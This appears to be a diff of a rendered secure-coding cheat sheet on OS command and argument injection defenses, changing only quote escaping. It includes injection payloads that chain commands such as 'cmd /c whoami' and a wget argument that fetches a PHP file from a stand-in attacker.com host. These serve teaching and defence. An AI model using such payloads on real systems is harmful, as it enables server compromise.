@@ -4413,7 +4413,7 @@
 </code></pre></div>
 <p>when typed in a Windows command prompt, the application <em>Calculator</em> is displayed.</p>
 <p>However, if the supplied value has been tampered with, and now it is:</p>
-<div class="highlight"><pre><span></span><code>calc<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;test&quot;</span>
+<div class="highlight"><pre><span></span><code>calc<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"test"</span>
 </code></pre></div>
 <p>when executed, it changes the meaning of the initial intended value.</p>
 <p>Now, both the <em>Calculator</em> application and the value <em>test</em> are displayed:</p>
@@ -4422,11 +4422,11 @@
 <h3 id="argument-injection">Argument Injection<a class="headerlink" href="#argument-injection" title="Permanent link">&para;</a></h3>
 <p>Every OS Command Injection is also an Argument Injection. In this type of attacks, user input can be passed as arguments while executing a specific command.</p>
 <p>For example, if the user input is passed through an escape function to escape certain characters like <code>&amp;</code>, <code>|</code>, <code>;</code>, etc.</p>
-<div class="highlight"><pre><span></span><code><span class="x">system(&quot;curl &quot; . escape($url));</span>
+<div class="highlight"><pre><span></span><code><span class="x">system("curl " . escape($url));</span>
 </code></pre></div>
 <p>which will prevent an attacker to run other commands.</p>
 <p>However, if the attacker controlled string contains an additional argument of the <code>curl</code> command:</p>
-<div class="highlight"><pre><span></span><code><span class="x">system(&quot;curl &quot; . escape(&quot;--help&quot;))</span>
+<div class="highlight"><pre><span></span><code><span class="x">system("curl " . escape("--help"))</span>
 </code></pre></div>
 <p>Now when the above code is executed, it will show the output of <code>curl --help</code>.</p>
 <p>Depending upon the system command used, the impact of an Argument injection attack can range from <strong>Information Disclosure</strong> to critical <strong>Remote Code Execution</strong>.</p>
@@ -4455,7 +4455,7 @@
 <li>According to <strong>Guideline 10</strong> of this <a href="https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html">POSIX</a>, <em>The first -- argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the '-' character.</em> For example, <code>curl -- $url</code> will prevent an argument injection even if the <code>$url</code> is malformed and contains an additional argument.</li>
 </ul>
 <p><strong>Note A:</strong></p>
-<div class="highlight"><pre><span></span><code>&amp; |  ; $ &gt; &lt; ` \ ! &#39; &quot; ( )
+<div class="highlight"><pre><span></span><code>&amp; |  ; $ &gt; &lt; ` \ ! ' " ( )
 </code></pre></div>
 <h2 id="additional-defenses">Additional Defenses<a class="headerlink" href="#additional-defenses" title="Permanent link">&para;</a></h2>
 <p>On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.</p>
@@ -4473,31 +4473,31 @@
 <p><strong><code>Runtime.exec</code> does NOT try to invoke the shell at any point and does not support shell metacharacters</strong>.</p>
 <p>The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using  <code>&amp;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>||</code>, etc,  redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.</p>
 <p><em>Code to test the note above:</em></p>
-<div class="highlight"><pre><span></span><code><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">specialChars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;&amp;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&amp;&amp;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;|&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;||&quot;</span><span class="p">};</span>
-<span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;cmd /c whoami&quot;</span><span class="p">;</span>
-<span class="n">String</span><span class="w"> </span><span class="n">cmdTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;java -version %s &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">payload</span><span class="p">;</span>
+<div class="highlight"><pre><span></span><code><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">specialChars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">"&amp;"</span><span class="p">,</span><span class="w"> </span><span class="s">"&amp;&amp;"</span><span class="p">,</span><span class="w"> </span><span class="s">"|"</span><span class="p">,</span><span class="w"> </span><span class="s">"||"</span><span class="p">};</span>
+<span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"cmd /c whoami"</span><span class="p">;</span>
+<span class="n">String</span><span class="w"> </span><span class="n">cmdTemplate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"java -version %s "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">payload</span><span class="p">;</span>
 <span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span>
 <span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="p">;</span>
 <span class="kt">int</span><span class="w"> </span><span class="n">returnCode</span><span class="p">;</span>
 <span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">specialChar</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">specialChars</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span><span class="n">cmdTemplate</span><span class="p">,</span><span class="w"> </span><span class="n">specialChar</span><span class="p">);</span>
-<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">&quot;#### TEST CMD: %s\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">);</span>
+<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">"#### TEST CMD: %s\n"</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">);</span>
 <span class="w">    </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
 <span class="w">    </span><span class="n">returnCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">();</span>
-<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">&quot;RC    : %s\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">returnCode</span><span class="p">);</span>
-<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">&quot;OUT   :\n%s\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span>
-<span class="w">                      </span><span class="s">&quot;utf-8&quot;</span><span class="p">));</span>
-<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">&quot;ERROR :\n%s\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">(),</span>
-<span class="w">                      </span><span class="s">&quot;utf-8&quot;</span><span class="p">));</span>
+<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">"RC    : %s\n"</span><span class="p">,</span><span class="w"> </span><span class="n">returnCode</span><span class="p">);</span>
+<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">"OUT   :\n%s\n"</span><span class="p">,</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span>
+<span class="w">                      </span><span class="s">"utf-8"</span><span class="p">));</span>
+<span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">"ERROR :\n%s\n"</span><span class="p">,</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">(),</span>
+<span class="w">                      </span><span class="s">"utf-8"</span><span class="p">));</span>
 <span class="p">}</span>
-<span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">&quot;#### TEST PAYLOAD ONLY: %s\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">);</span>
+<span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">"#### TEST PAYLOAD ONLY: %s\n"</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">);</span>
 <span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
 <span class="n">returnCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">();</span>
-<span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">&quot;RC    : %s\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">returnCode</span><span class="p">);</span>
-<span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">&quot;OUT   :\n%s\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span>
-<span class="w">                  </span><span class="s">&quot;utf-8&quot;</span><span class="p">));</span>
-<span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">&quot;ERROR :\n%s\n&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">(),</span>
-<span class="w">                  </span><span class="s">&quot;utf-8&quot;</span><span class="p">));</span>
+<span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">"RC    : %s\n"</span><span class="p">,</span><span class="w"> </span><span class="n">returnCode</span><span class="p">);</span>
+<span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">"OUT   :\n%s\n"</span><span class="p">,</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">(),</span>
+<span class="w">                  </span><span class="s">"utf-8"</span><span class="p">));</span>
+<span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">printf</span><span class="p">(</span><span class="s">"ERROR :\n%s\n"</span><span class="p">,</span><span class="w"> </span><span class="n">IOUtils</span><span class="p">.</span><span class="na">toString</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">getErrorStream</span><span class="p">(),</span>
+<span class="w">                  </span><span class="s">"utf-8"</span><span class="p">));</span>
 </code></pre></div>
 <p><em>Result of the test:</em></p>
 <div class="highlight"><pre><span></span><code>##### TEST CMD: java -version &amp; cmd /c whoami
@@ -4505,28 +4505,28 @@ RC    : 0
 OUT   :
 
 ERROR :
-java version &quot;1.8.0_31&quot;
+java version "1.8.0_31"
 
 ##### TEST CMD: java -version &amp;&amp; cmd /c whoami
 RC    : 0
 OUT   :
 
 ERROR :
-java version &quot;1.8.0_31&quot;
+java version "1.8.0_31"
 
 ##### TEST CMD: java -version | cmd /c whoami
 RC    : 0
 OUT   :
 
 ERROR :
-java version &quot;1.8.0_31&quot;
+java version "1.8.0_31"
 
 ##### TEST CMD: java -version || cmd /c whoami
 RC    : 0
 OUT   :
 
 ERROR :
-java version &quot;1.8.0_31&quot;
+java version "1.8.0_31"
 
 ##### TEST PAYLOAD ONLY: cmd /c whoami
 RC    : 0
@@ -4536,16 +4536,16 @@ mydomain\simpleuser
 ERROR :
 </code></pre></div>
 <p><em>Incorrect usage:</em></p>
-<div class="highlight"><pre><span></span><code><span class="n">ProcessBuilder</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="s">&quot;C:\DoStuff.exe -arg1 -arg2&quot;</span><span class="p">);</span>
+<div class="highlight"><pre><span></span><code><span class="n">ProcessBuilder</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="s">"C:\DoStuff.exe -arg1 -arg2"</span><span class="p">);</span>
 </code></pre></div>
 <p>In this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings.</p>
 <p><em>Correct Usage:</em></p>
 <p>Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted.</p>
-<div class="highlight"><pre><span></span><code><span class="n">ProcessBuilder</span><span class="w"> </span><span class="n">pb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="s">&quot;TrustedCmd&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;TrustedArg1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;TrustedArg2&quot;</span><span class="p">);</span>
+<div class="highlight"><pre><span></span><code><span class="n">ProcessBuilder</span><span class="w"> </span><span class="n">pb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="s">"TrustedCmd"</span><span class="p">,</span><span class="w"> </span><span class="s">"TrustedArg1"</span><span class="p">,</span><span class="w"> </span><span class="s">"TrustedArg2"</span><span class="p">);</span>
 
 <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pb</span><span class="p">.</span><span class="na">environment</span><span class="p">();</span>
 
-<span class="n">pb</span><span class="p">.</span><span class="na">directory</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&quot;TrustedDir&quot;</span><span class="p">));</span>
+<span class="n">pb</span><span class="p">.</span><span class="na">directory</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">"TrustedDir"</span><span class="p">));</span>
 
 <span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pb</span><span class="p">.</span><span class="na">start</span><span class="p">();</span>
 </code></pre></div>
@@ -4557,8 +4557,8 @@ ERROR :
 <p><code>escapeshellcmd()</code>: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.</p>
 <p>It is always preferable to use <code>escapeshellarg()</code> rather than <code>escapeshellcmd()</code> when dealing with user input.</p>
 <p>For example, consider this code using <code>wget</code> with <code>escapeshellcmd()</code>:</p>
-<div class="highlight"><pre><span></span><code><span class="x">$url = $_GET[&#39;url&#39;];</span>
-<span class="x">$command = &#39;wget --directory-prefix=..\temp &#39; . $url;</span>
+<div class="highlight"><pre><span></span><code><span class="x">$url = $_GET['url'];</span>
+<span class="x">$command = 'wget --directory-prefix=..\temp ' . $url;</span>
 <span class="x">system(escapeshellcmd($command));</span>
 </code></pre></div>
 <p>If the user provides:</p>
@@ -4566,12 +4566,12 @@ ERROR :
 </code></pre></div>
 <p><code>escapeshellcmd()</code> will still allow this extra parameter meaning the attacker can override the original <code>--directory-prefix</code> option, save the file in the current directory and then achieve remote command execution on the server.</p>
 <p>The safe approach is to use <code>escapeshellarg()</code> so that the URL is treated as a single argument:</p>
-<div class="highlight"><pre><span></span><code><span class="x">$url = $_GET[&#39;url&#39;];</span>
-<span class="x">$command = &#39;wget --directory-prefix=..\temp &#39; . escapeshellarg($url);</span>
+<div class="highlight"><pre><span></span><code><span class="x">$url = $_GET['url'];</span>
+<span class="x">$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);</span>
 <span class="x">system($command);</span>
 </code></pre></div>
 <p>Now the malicious input becomes:</p>
-<div class="highlight"><pre><span></span><code>wget --directory-prefix=..\temp &#39;--directory-prefix=. http://attacker.com/malicious.php&#39;
+<div class="highlight"><pre><span></span><code>wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
 </code></pre></div>
 <p>Here, the second <code>--directory-prefix</code> is part of the quoted string, not a real option, so the attack fails.</p>
 <p>In addition, it is good security practice to follow these recommendations:  </p>
